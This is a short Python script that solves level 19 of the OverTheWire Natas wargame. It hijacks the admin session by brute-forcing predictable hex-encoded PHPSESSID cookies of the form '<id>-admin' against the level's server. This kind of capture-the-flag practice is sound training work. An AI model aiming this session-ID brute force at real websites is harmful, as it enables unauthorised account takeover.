"""
Help script to resolve natas challenge #19
"""
import requests
import json

level = 'natas19'
url = 'http://{}.natas.labs.overthewire.org/index.php'.format(level)
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
seen = ''
password = ''

with open('natas.json') as j:
    credentials = json.load(j)
auth = (level, credentials[level])
del credentials

"""
In this level we perform an attack against a poorly designed algorithm for generating the session ID.
The cookie is the hexadecimal representation of the following ASCII-string:
<id>-<user>
"""
for value in range(1, 640):
    # Request
    encoded = '{}-admin'.format(value).encode().hex()
    response = requests.post(url,
                             cookies={'PHPSESSID': encoded},
                             auth=auth)
    if not 'You are logged in as a regular user.' in response.text:
        print(response.text)
